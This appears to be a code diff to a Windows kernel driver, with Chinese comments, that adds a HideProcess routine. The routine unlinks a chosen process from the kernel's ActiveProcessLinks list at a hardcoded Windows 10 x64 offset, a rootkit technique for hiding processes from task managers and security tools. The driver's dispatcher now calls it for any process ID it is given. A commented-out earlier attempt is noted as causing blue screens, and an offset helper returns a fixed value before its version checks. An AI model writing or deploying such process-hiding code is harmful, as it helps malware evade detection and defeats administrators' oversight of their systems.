@@ -20,6 +20,60 @@ VOID GetProcess(ULONG processId) {
 		ObDereferenceObject(Process);
 	}
 }
+// 获取(ActiveProcessLinks)进程链表的相对(EPROCESS)偏移
+ULONG GetProcessOffset()
+{
+	return 0x448;
+	if (SharedUserData->NtMajorVersion == 5) // 如果位 Windows Xp
+	{
+		return 0x88;
+	}
+	else if ((SharedUserData->NtMajorVersion == 6) &&
+		(SharedUserData->NtMinorVersion == 1)) // 如果为Windows7
+	{
+		if (sizeof(PVOID) == 4) // 如果为 32 位Windows7
+		{
+			return 0x0b8;
+		}
+		else // 如果为 64 位Windows7
+		{
+			return 0x188;
+		}
+	}
+	return 0;
+}
+VOID HideProcess(HANDLE hProcessId)
+{
+	PLIST_ENTRY BmpList = { 0 };
+	PEPROCESS Process;
+	ULONG offset;
+	NTSTATUS status = PsLookupProcessByProcessId(hProcessId, &Process);
+	if (!NT_SUCCESS(status))
+	{
+		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "查找进程失败\n"));
+		return;
+	}
+	BmpList = (PLIST_ENTRY)(((PUCHAR)Process + 0x448)); // WINDOWS 10 X64 ActiveProcessLinks
+	//隐藏进程
+	BmpList->Flink->Blink = BmpList->Blink;
+	BmpList->Blink->Flink = BmpList->Flink;
+
+	// --------------------------------------------------- 以下为失败品 | 谨记 ------------------------------------------ //
+
+	//offset = GetProcessOffset();
+	//if (offset == 0) { DbgPrint("offset == 0\n"); return; }
+	//if (MiProcessLoaderEntry != NULL)
+	//{
+	//	// 将进程从进程链表中剔除, 达到隐藏进程的效果
+	//	MiProcessLoaderEntry((PCHAR)Process + offset/*LDR_DATA_TABLE_ENTRY驱动结构体*/, // 会蓝屏
+	//		FALSE/*FALSE为从驱动链表中删除，TRUE为插入*/);
+	//	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "隐藏进程成功\n"));
+	//}
+	//else
+	//{
+	//	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "隐藏进程失败\n"));
+	//}
+}
 
 NTSTATUS
 IrpCommon(
@@ -229,6 +283,7 @@ NTSTATUS MainDispatcher(PDEVICE_OBJECT devobj, PIRP irp)
 		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "MainDispatcher -> op->ProcessId: %d\n", op->ProcessId));
 		ULONG processId = op->ProcessId;
 		GetProcess(processId);
+		HideProcess(processId);
 		break;
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
@@ -244,6 +299,7 @@ NTSTATUS DriverEntry(
 	IN PUNICODE_STRING RegistryPath
 )
 {
+	//MiProcessLoaderEntry = (pMiProcessLoaderEntry)0xfffff80534b88ee4; // 这是用 dp 来定位的
 	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "DriverEntry\n"));
 	//KdBreakPoint();
 
